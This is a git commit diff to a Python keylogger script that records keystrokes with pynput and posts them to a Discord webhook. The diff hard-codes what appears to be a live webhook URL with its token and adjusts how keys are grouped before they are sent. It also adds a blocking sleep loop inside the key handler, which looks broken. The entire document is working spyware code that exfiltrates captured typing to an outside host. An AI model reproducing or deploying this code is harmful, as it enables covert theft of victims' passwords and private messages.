733b85d5c04818f301d423c1242def22b94fe927
Erik Ben <Star4gamer20@gmail.com>
2024-11-25 22:41:52 +0530

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -16,22 +16,24 @@ def on_press(key):
             send_to_discord("[key.ENTER]")
         elif key == pynput.keyboard.Key.space:
             key_pressed = " "
-        elif key == pynput.keyboard.Key.backspace:
+        elif key == pynput.keyboard.Key.shift:
             key_pressed = ""
-            send_to_discord("[key.backspace]")
         else:
             key_pressed = f"[{key}]"
 
-    if key_pressed != "":
+    if key_pressed != " ":
         current_word.append(key_pressed)
 
-    if key_pressed == "" or key_pressed == "\n":
+    if key_pressed == " " or key_pressed == "\n" or key_pressed == "":
         if len(current_word) > 1:
-            send_to_discord(''.join(current_word))
+            send_to_discord(' '.join(current_word))
         current_word = []
 
+    while True:
+        time.sleep(1)
+
 def send_to_discord(key):
-    url = YOUR DISCORD WEBHOOK
+    url = "https://discord.com/api/webhooks/1309903363550478356/7TzOHTOlo6VOoinI0TumhhqziTIU5yYISUqaqU8EXg2wPTGUhZackDCTcciTvdOZ_a5V"
     data = {"content": key}
     requests.post(url, json=data)
 
